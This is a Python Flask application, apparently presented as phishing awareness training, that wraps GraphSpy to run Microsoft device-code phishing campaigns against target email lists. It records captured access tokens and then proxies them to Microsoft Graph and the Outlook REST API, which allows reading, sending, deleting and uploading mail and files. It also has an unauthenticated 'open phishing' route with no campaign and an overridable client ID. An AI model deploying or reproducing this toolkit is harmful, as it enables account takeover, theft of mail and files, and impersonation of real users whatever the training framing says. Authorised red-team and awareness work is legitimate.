import json
#!/usr/bin/env python3
"""
ThreatClass — Security Awareness Training Platform
Wraps GraphSpy for the technical engine. Adds campaigns, tracking, and instructor dashboard.
"""

import json, os, sqlite3, secrets, datetime
from functools import wraps
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, g
import requests as http_req

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

DB_PATH = "/opt/threatclass/threatclass.db"
GRAPHSPY_URL = "http://127.0.0.1:5000"
CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"

# ========== Database ==========

def get_db():
    db = getattr(g, '_db', None)
    if db is None:
        db = g._db = sqlite3.connect(DB_PATH)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    db = sqlite3.connect(DB_PATH)
    db.executescript("""
        CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            description TEXT,
            status TEXT DEFAULT 'draft',
            created_at TEXT DEFAULT (datetime('now')),
            started_at TEXT,
            ended_at TEXT,
            template TEXT DEFAULT 'microsoft_device_login',
            pretext_subject TEXT,
            pretext_body TEXT
        );
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id INTEGER REFERENCES campaigns(id),
            email TEXT NOT NULL,
            department TEXT,
            status TEXT DEFAULT 'pending',
            link_token TEXT UNIQUE,
            sent_at TEXT,
            opened_at TEXT,
            clicked_at TEXT,
            code_shown_at TEXT,
            authenticated_at TEXT,
            lesson_shown_at TEXT,
            user_code TEXT,
            device_code_status TEXT
        );
        CREATE TABLE IF NOT EXISTS captured_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER REFERENCES targets(id),
            campaign_id INTEGER REFERENCES campaigns(id),
            user_code TEXT,
            access_token TEXT,
            refresh_token TEXT,
            user_email TEXT,
            scopes TEXT,
            captured_at TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS course_modules (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            description TEXT,
            content TEXT,
            order_num INTEGER DEFAULT 0,
            duration_minutes INTEGER DEFAULT 15
        );
    """)
    db.commit()
    db.close()

@app.teardown_appcontext
def close_db(exception):
    db = getattr(g, '_db', None)
    if db is not None:
        db.close()

# ========== Routes ==========

@app.route('/')
def dashboard():
    db = get_db()
    campaigns = db.execute("SELECT * FROM campaigns ORDER BY created_at DESC").fetchall()
    total_targets = db.execute("SELECT COUNT(*) FROM targets").fetchone()[0]
    total_clicked = db.execute("SELECT COUNT(*) FROM targets WHERE clicked_at IS NOT NULL").fetchone()[0]
    total_authed = db.execute("SELECT COUNT(*) FROM targets WHERE authenticated_at IS NOT NULL").fetchone()[0]
    total_lessons = db.execute("SELECT COUNT(*) FROM targets WHERE lesson_shown_at IS NOT NULL").fetchone()[0]
    active_campaigns = db.execute("SELECT COUNT(*) FROM campaigns WHERE status = 'active'").fetchone()[0]
    click_rate = round((total_clicked / total_targets * 100), 1) if total_targets > 0 else 0
    auth_rate = round((total_authed / total_targets * 100), 1) if total_targets > 0 else 0
    return render_template('dashboard.html', campaigns=campaigns, stats={
        'total_targets': total_targets, 'total_clicked': total_clicked,
        'total_authed': total_authed, 'total_lessons': total_lessons,
        'active_campaigns': active_campaigns, 'click_rate': click_rate, 'auth_rate': auth_rate
    })

@app.route('/campaign/new', methods=['GET', 'POST'])
def new_campaign():
    if request.method == 'POST':
        db = get_db()
        db.execute(
            "INSERT INTO campaigns (name, description, pretext_subject, pretext_body) VALUES (?, ?, ?, ?)",
            (request.form['name'], request.form.get('description',''),
             request.form.get('pretext_subject',''), request.form.get('pretext_body',''))
        )
        db.commit()
        campaign_id = db.execute("SELECT last_insert_rowid()").fetchone()[0]
        return redirect(url_for('campaign_detail', id=campaign_id))
    return render_template('campaign_new.html')

@app.route('/campaign/<int:id>')
def campaign_detail(id):
    db = get_db()
    campaign = db.execute("SELECT * FROM campaigns WHERE id = ?", (id,)).fetchone()
    targets = db.execute("SELECT * FROM targets WHERE campaign_id = ? ORDER BY id", (id,)).fetchall()
    tokens = db.execute("SELECT * FROM captured_tokens WHERE campaign_id = ?", (id,)).fetchall()
    stats = {
        'total': len(targets),
        'sent': len([t for t in targets if t['sent_at']]),
        'opened': len([t for t in targets if t['opened_at']]),
        'clicked': len([t for t in targets if t['clicked_at']]),
        'authed': len([t for t in targets if t['authenticated_at']]),
        'lessons': len([t for t in targets if t['lesson_shown_at']])
    }
    return render_template('campaign_detail.html', campaign=campaign, targets=targets, tokens=tokens, stats=stats)

@app.route('/campaign/<int:id>/add-targets', methods=['POST'])
def add_targets(id):
    db = get_db()
    targets_text = request.form.get('targets', '')
    for line in targets_text.strip().split('\n'):
        email = line.strip()
        if not email or '@' not in email:
            continue
        link_token = secrets.token_urlsafe(16)
        db.execute(
            "INSERT INTO targets (campaign_id, email, link_token) VALUES (?, ?, ?)",
            (id, email, link_token)
        )
    db.commit()
    return redirect(url_for('campaign_detail', id=id))

@app.route('/campaign/<int:id>/launch', methods=['POST'])
def launch_campaign(id):
    db = get_db()
    db.execute("UPDATE campaigns SET status = 'active', started_at = datetime('now') WHERE id = ?", (id,))
    db.execute("UPDATE targets SET status = 'active', sent_at = datetime('now') WHERE campaign_id = ?", (id,))
    db.commit()
    return redirect(url_for('campaign_detail', id=id))

@app.route('/campaign/<int:id>/stop', methods=['POST'])
def stop_campaign(id):
    db = get_db()
    db.execute("UPDATE campaigns SET status = 'completed', ended_at = datetime('now') WHERE id = ?", (id,))
    db.commit()
    return redirect(url_for('campaign_detail', id=id))

# ========== Phishing Landing Page ==========

@app.route('/verify/<token>')
def phish_landing(token):
    db = get_db()
    target = db.execute(
        "SELECT t.*, c.status as campaign_status FROM targets t JOIN campaigns c ON t.campaign_id = c.id WHERE t.link_token = ?",
        (token,)
    ).fetchone()
    if not target or target['campaign_status'] != 'active':
        return "Page not found.", 404
    if not target['opened_at']:
        db.execute("UPDATE targets SET opened_at = datetime('now'), status = 'opened' WHERE id = ?", (target['id'],))
        db.commit()
    return render_template('phish_landing.html', token=token)

@app.route('/api/phish/generate-code', methods=['POST'])
def phish_generate_code():
    data = request.json or {}
    token = data.get('token', '')
    db = get_db()
    target = db.execute("SELECT * FROM targets WHERE link_token = ?", (token,)).fetchone()
    if not target:
        return jsonify({"error": "invalid"}), 404
    if not target['clicked_at']:
        db.execute("UPDATE targets SET clicked_at = datetime('now'), status = 'clicked' WHERE id = ?", (target['id'],))
        db.commit()
    try:
        resp = http_req.post(f"{GRAPHSPY_URL}/api/generate_device_code", data={
            "version": "1", "client_id": CLIENT_ID, "resource": "https://graph.microsoft.com"
        }, timeout=15)
        user_code = resp.text.strip().strip('"')
        db.execute("UPDATE targets SET user_code = ?, code_shown_at = datetime('now'), status = 'code_shown' WHERE id = ?",
                   (user_code, target['id']))
        db.commit()
        return jsonify({"user_code": user_code})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/phish/poll-status', methods=['POST'])
def phish_poll_status():
    data = request.json or {}
    token = data.get('token', '')
    user_code = data.get('user_code', '')
    db = get_db()
    target = db.execute("SELECT * FROM targets WHERE link_token = ?", (token,)).fetchone()
    if not target:
        return jsonify({"status": "unknown"})
    try:
        resp = http_req.get(f"{GRAPHSPY_URL}/api/list_device_codes", timeout=10)
        codes = resp.json()
        for c in codes:
            if isinstance(c, dict) and c.get("user_code") == user_code:
                s = c.get("status", "").upper()
                if s == "SUCCESS":
                    if not target['authenticated_at']:
                        db.execute("UPDATE targets SET authenticated_at = datetime('now'), status = 'compromised' WHERE id = ?",
                                  (target['id'],))
                        try:
                            at_resp = http_req.get(f"{GRAPHSPY_URL}/api/list_access_tokens", timeout=10)
                            tokens = at_resp.json()
                            if tokens:
                                latest = tokens[-1] if isinstance(tokens, list) else None
                                if latest:
                                    db.execute(
                                        "INSERT INTO captured_tokens (target_id, campaign_id, user_code, user_email, captured_at) VALUES (?, ?, ?, ?, datetime('now'))",
                                        (target['id'], target['campaign_id'], user_code, latest.get('user', 'unknown'))
                                    )
                        except: pass
                        db.commit()
                    return jsonify({"status": "captured"})
                elif s == "EXPIRED":
                    return jsonify({"status": "expired"})
                elif s in ("DECLINED",):
                    return jsonify({"status": "declined"})
                else:
                    return jsonify({"status": "pending"})
        return jsonify({"status": "pending"})
    except:
        return jsonify({"status": "pending"})

@app.route('/api/phish/lesson-viewed', methods=['POST'])
def phish_lesson_viewed():
    data = request.json or {}
    token = data.get('token', '')
    db = get_db()
    db.execute("UPDATE targets SET lesson_shown_at = datetime('now'), status = 'lesson_viewed' WHERE link_token = ?", (token,))
    db.commit()
    return jsonify({"status": "ok"})

# ========== Other Pages ==========

@app.route('/course')
def course_overview():
    db = get_db()
    modules = db.execute("SELECT * FROM course_modules ORDER BY order_num").fetchall()
    return render_template('course.html', modules=modules)

@app.route('/reports')
def reports():
    db = get_db()
    campaigns = db.execute("SELECT * FROM campaigns WHERE status = 'completed' ORDER BY ended_at DESC").fetchall()
    return render_template('reports.html', campaigns=campaigns)



@app.route('/api/proxy/graph', methods=['POST'])
def proxy_graph():
    """Proxy Graph API calls to GraphSpy. Supports method + body passthrough."""
    data = request.form.to_dict()
    # For sendMail/move/patch, forward body and method to generic_graph
    try:
        resp = http_req.post(f"{GRAPHSPY_URL}/api/generic_graph", data=data, timeout=30)
        return resp.text, resp.status_code, {'Content-Type': 'application/json'}
    except Exception as e:
        return jsonify({"error": {"code": "ProxyError", "message": str(e)}}), 500


@app.route('/api/proxy/outlook', methods=['POST'])
def proxy_outlook():
    """Proxy Outlook REST API calls. Token must be scoped for outlook.office365.com."""
    token_id = request.form.get('access_token_id', '')
    outlook_uri = request.form.get('outlook_uri', '')
    method = request.form.get('method', 'GET')
    body = request.form.get('body', '')

    # Get the raw access token from GraphSpy
    try:
        resp = http_req.get(f"{GRAPHSPY_URL}/api/get_access_token/{token_id}", timeout=10)
        token_data = resp.json() if hasattr(resp, 'json') else json.loads(resp.text)
        access_token = token_data.get('accesstoken', '')
    except:
        return jsonify({"error": {"code": "TokenError", "message": "Failed to get token"}}), 500

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    try:
        if method == 'GET':
            r = http_req.get(outlook_uri, headers=headers, timeout=30)
        elif method == 'POST':
            r = http_req.post(outlook_uri, headers=headers, data=body if body else None, timeout=30)
        elif method == 'PATCH':
            r = http_req.patch(outlook_uri, headers=headers, data=body if body else None, timeout=30)
        elif method == 'DELETE':
            r = http_req.delete(outlook_uri, headers=headers, timeout=30)
        elif method == 'PUT':
            r = http_req.put(outlook_uri, headers=headers, data=body if body else None, timeout=30)
        else:
            r = http_req.get(outlook_uri, headers=headers, timeout=30)

        return r.text or '{}', r.status_code, {'Content-Type': 'application/json'}
    except Exception as e:
        return jsonify({"error": {"code": "ProxyError", "message": str(e)}}), 500

@app.route('/api/proxy/graph_upload', methods=['POST'])
def proxy_graph_upload():
    """Proxy file upload calls to GraphSpy."""
    try:
        resp = http_req.post(f"{GRAPHSPY_URL}/api/generic_graph_upload", data=request.form, files=request.files, timeout=60)
        return resp.text, resp.status_code, {'Content-Type': 'application/json'}
    except Exception as e:
        return jsonify({"error": {"code": "ProxyError", "message": str(e)}}), 500


@app.route('/drive')
def drive_portal():
    token_id = request.args.get('token', '0')
    return render_template('drive.html', token_id=token_id)

@app.route('/onenote')
def onenote_portal():
    token_id = request.args.get('token', '0')
    return render_template('onenote.html', token_id=token_id)

@app.route('/owa')
def owa_portal():
    token_id = request.args.get('token', '0')
    return render_template('owa.html', token_id=token_id)

# ========== Open Phishing (auto-generates per visitor, no campaign needed) ==========

@app.route('/phish')
def phish_open():
    return render_template('phish_open.html')

@app.route('/api/open/generate-code', methods=['POST'])
def open_generate_code():
    data = request.json or {}
    # Allow overriding client_id from request
    client = data.get('client_id', CLIENT_ID)
    resource = data.get('resource', 'https://graph.microsoft.com')
    try:
        resp = http_req.post(f"{GRAPHSPY_URL}/api/generate_device_code", data={
            "version": "1",
            "client_id": client,
            "resource": resource
        }, timeout=15)
        user_code = resp.text.strip().strip('"')
        return jsonify({"user_code": user_code, "client": client, "resource": resource})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/open/poll-status', methods=['POST'])
def open_poll_status():
    data = request.json or {}
    uc = data.get('user_code', '')
    try:
        resp = http_req.get(f"{GRAPHSPY_URL}/api/list_device_codes", timeout=10)
        codes = resp.json()
        for c in codes:
            if isinstance(c, dict) and c.get('user_code') == uc:
                s = c.get('status', '').upper()
                if s == 'SUCCESS': return jsonify({"status": "captured"})
                elif s == 'EXPIRED': return jsonify({"status": "expired"})
                elif s in ('DECLINED',): return jsonify({"status": "declined"})
                else: return jsonify({"status": "pending"})
        return jsonify({"status": "pending"})
    except:
        return jsonify({"status": "pending"})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=8080, debug=False)

